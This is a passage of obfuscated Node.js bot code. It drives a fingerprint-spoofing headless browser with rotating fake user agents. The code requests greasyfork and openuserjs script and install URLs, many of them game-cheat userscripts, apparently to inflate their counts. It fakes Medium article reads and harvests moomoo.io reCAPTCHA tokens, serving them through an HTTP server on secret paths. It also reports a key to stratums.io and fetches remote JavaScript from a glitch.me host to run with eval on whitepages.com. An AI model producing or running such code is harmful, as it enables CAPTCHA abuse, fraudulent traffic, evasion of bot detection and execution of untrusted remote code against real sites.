      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xb) + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': Z(0xe) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + W(0x13) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    W(0xd) + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + Z(0x12) + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x24b0 + -0x2424 + -0x48d4 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x8dd + 0x5 * -0x1df + 0xe * 0x9)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const a0 = c;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': a0(0x14)
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x109b * -0x1 + -0x1 * 0x1589 + -0x1c6 * -0x3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1a0 + 0x1f4f + -0x208b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x4 * 0x2be + -0xdd + 0xbd5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xb97 + 0x653 * 0x1 + -0x11ea; w < getRandomInt(-0x31 * 0x74 + -0x3 * -0x38f + -0x148 * -0x9, -0x34 * 0x83 + -0x11a1 * -0x1 + 0x18 * 0x60); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x4a5 * -0x34 + -0x18823 + 0x1 * 0x36407);
        }
      }();
    }, -0x2d * -0x57 + -0x4af + -0xa38), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x153b + -0x1 * 0x952 + 0x1e8d;
      const x = await v['newPage']();
      if (await x[a1(0x4)]('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0x1ee3 + -0x106a + 0x2f4d * 0x1, 0x16a4 + 0x1396 + -0x2a08 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1bdb + -0xdb * 0x71 + 0xf1b6);
    }, 0x2108 + 0xb3 * 0x2 + -0x220a), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x13ae + 0x4 * -0x964 + -0x28e * -0x7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1c39 + -0x8df * -0x3 + 0xd54), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x597 + -0xff0 + 0x1587), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x206b + -0xe268 + 0xe7d9d * 0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x3eb * -0x5 + 0x71 * 0x55 + -0x118a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x2250 + -0x178b + -0x1 * 0x9fd);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xff9 + 0x2cec + -0x1d55);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c;
  async function f() {
    const a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xf7c + -0x5dd + 0x2 * -0x4cf) {
        const a2 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1e6 * 0x9 + -0x7 * -0x1bf + -0x7 * -0xb2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x12ca + -0x981 + -0x1 * -0x1c4b, D['indexOf']('\x20'));
        return B ? E[a2(0x5)](-0x1eec * -0x1 + -0x5 * -0x5d5 + -0x3 * 0x1407, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x20c7 + 0x36ee + -0x30a5),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x13 * -0x339 + 0x2 * -0x163d + 0x90c5 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + a3(0x7) + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + a4(0x15) + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xb24 + -0x6a8 + -0x47c; k < 0x11f0 * -0x2 + 0x4 * 0x87f + 0x1e8; k++)
    setTimeout(f, (-0xba27 + 0x1 * 0x5f06 + 0x14581) * k * getRandomInt(-0x1c29 + 0x2f2 * -0x7 + 0x30c8, -0x1f67 + -0x2 * -0x3d1 + 0x17c8));
  setInterval(() => {
    f();
    for (let l = -0x1316 + 0x218a + -0x25 * 0x64; l < 0x214d + -0x1 * 0x1af3 + 0x656 * -0x1; l++)
      setTimeout(f, (0x12ae0 + -0x332 * -0x2e + 0x2a4c * -0x5) * l * getRandomInt(0x9a6 + 0xcf3 + 0x1698 * -0x1, 0xafb * 0x2 + -0x73a * 0x4 + 0x6f5 * 0x1));
  }, 0x5 * 0x3d8c7 + -0x2 * 0x11c913 + 0x4744c3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
